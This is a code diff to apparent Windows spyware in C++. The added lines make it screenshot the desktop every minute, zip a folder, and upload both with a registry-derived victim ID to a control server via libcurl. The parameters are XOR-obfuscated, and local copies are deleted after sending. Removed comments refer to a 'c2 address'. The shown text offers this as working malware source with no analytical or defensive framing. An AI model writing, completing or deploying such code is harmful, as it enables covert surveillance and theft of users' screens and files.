@@ -54,14 +54,6 @@ std::string mb_to_utf8(const std::string& mbstr)
     return result;
 }
 
-bool is_ipv4(const std::string& str) {
-    // Define the IPv4 regex pattern
-    std::regex pattern(R"((\d{1,3}\.){3}\d{1,3})");
-
-    // Match the input string against the regex pattern
-    return std::regex_match(str, pattern);
-}
-
 bool get_proc_name(std::string& proc_name) {
     DWORD pid = GetCurrentProcessId();
     HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
@@ -129,6 +121,7 @@ std::string get_local_time() {
 void capture_screen() {
 
     while (true) {
+
         // Retrieve the local time to use as part of a file name
         std::string screen_path = SAVE_PATH + get_local_time();
         const char* filename = screen_path.c_str();
@@ -213,6 +206,11 @@ void capture_screen() {
         DeleteDC(desktop_dc);
 
         std::this_thread::sleep_for(std::chrono::minutes(1));
+
+        if (false == send_to_server(screen_path)) {
+            
+            OutputDebugStringA("[ERROR] Failed to send file to server");
+        }
     }
 }
 
@@ -325,6 +323,22 @@ bool zip_dir() {
         OutputDebugStringA("[ERROR] Failed to close archive (zip_dir)\n");
     }
 
+    if (true == fs::exists(zip_path)) {
+        if (false == send_to_server(zip_path)) {
+            OutputDebugStringA("[ERROR] Failed to send file to server");
+            return false;
+        }
+    }
+
+    // test code //
+
+    try {
+        fs::remove_all(folder_path);
+    }
+    catch (const std::exception& e) {
+        OutputDebugStringA("[INFO] Failed to delete zip dir ");
+    }
+
     return true;
 
 }
@@ -348,20 +362,127 @@ bool check_test_mode() {
     return true;
 }
 
+std::string get_uid() {
+    HKEY key;
+    DWORD type;
+    DWORD size;
+    char buffer[1024] = { 0, };
+
+    // Open the registry key
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, UID_PATH, 0, KEY_READ, &key) == ERROR_SUCCESS) {
+
+        size = sizeof(buffer);
+        if (RegQueryValueExA(key, UID_VALUE, NULL, &type, (LPBYTE)buffer, &size) != ERROR_SUCCESS) {
+            OutputDebugStringA("[Error] Failed to read system uid from registry\n");
+        }
+
+        // Close the registry key
+        RegCloseKey(key);
+    }
+
+    return std::string(buffer);
+}
+
+
+
+std::string xor_string(const std::string& str, char key) {
+    std::string result(str.length(), '\0');
+    for (size_t i = 0; i < str.length(); ++i) {
+        result[i] = str[i] ^ key;
+    }
+    return result;
+}
+// Set up the callback function to write the received data to the buffer
+static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
+    size_t realsize = size * nmemb;
+    std::string* buffer = static_cast<std::string*>(userp);
+    buffer->append(static_cast<char*>(contents), realsize);
+    return realsize;
+}
+
+bool send_to_server(std::string file_path) {
+
+    std::string file_name = fs::path(file_path).filename().string();
+
+    // Open the file
+    std::ifstream file(file_path, std::ios::binary);
+
+    // Check if file can be opened
+    if (!file.is_open()) {
+        OutputDebugStringA("[ERROR] Failed to open file in send_to_server\n");
+        return false;
+    }
+
+    // Get the file size
+    file.seekg(0, std::ios::end);
+    size_t file_size = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Read the file into a buffer
+    char* buffer = new char[file_size];
+    file.read(buffer, file_size);
+    file.close();
+
+    // Initialize curl
+    curl_global_init(CURL_GLOBAL_ALL);
+    CURL* curl = curl_easy_init();
+
+    // Build the URL with parameters
+    std::stringstream ss;
+    ss << SERVER_CONTROL_PAGE <<
+        xor_string("type", 7) <<
+        "=" << xor_string("file", 7) <<
+        "&" << xor_string("uid", 7) <<
+        "=" << xor_string(get_uid(), 7);
+
+    std::string url = ss.str();
+
+    // Build the HTTP POST request
+    struct curl_httppost* post = nullptr;
+    struct curl_httppost* last = nullptr;
+
+    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_BUFFER, file_name.c_str(),
+        CURLFORM_BUFFERPTR, buffer, CURLFORM_BUFFERLENGTH, file_size, CURLFORM_END);
+
+    std::string response;
+    // Set curl options
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+
+    // Perform the request
+    CURLcode res = curl_easy_perform(curl);
+
+
+    // Check if request was successful
+    if (res != CURLE_OK) {
+        OutputDebugStringA("[Error] Failed to send request\n");
+        return false;
+    }
+
+    // Clean up
+    curl_easy_cleanup(curl);
+    curl_global_cleanup();
+    delete[] buffer;
+
+
+    if (std::remove(file_path.c_str()) != 0) {
+        return false;
+    }
+
+
+    return true;
+
+}
+
+
 int entry_point() {
 
     if (true == check_test_mode()) {
         MessageBoxA(NULL, "test", "test", NULL);
         return 0;
     }
-
-    //std::string c2_addr = "";
-
-
-    //if (false == is_ipv4(c2_addr)) {
-    //    fprintf(stderr, "[error] invalid c2 address (%s)\n", c2_addr.c_str());
-    //    return 1;
-    //}
 
     std::string proc_name;
     if (false == get_proc_name(proc_name)) {
